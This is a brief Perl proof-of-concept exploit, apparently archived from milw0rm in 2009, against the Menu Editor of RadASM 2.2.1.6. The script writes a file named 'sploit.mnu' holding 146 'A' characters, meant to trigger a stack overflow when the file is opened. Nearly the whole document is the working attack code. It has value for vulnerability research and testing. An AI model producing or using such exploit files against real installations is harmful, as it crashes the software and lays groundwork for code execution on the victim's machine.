# RadASM 2.2.1.6 Menu Editor (.mnu) file stack overlow PoC
# Coded by Pankaj Kohli
# http://www.pank4j.com
 
$str="A"x146;
$file="sploit.mnu";
open(my $FILE, ">>$file") or die "Error opening file.n";
print $FILE $str ;
close($FILE);
print "$file has been created.n";

# milw0rm.com [2009-08-04]
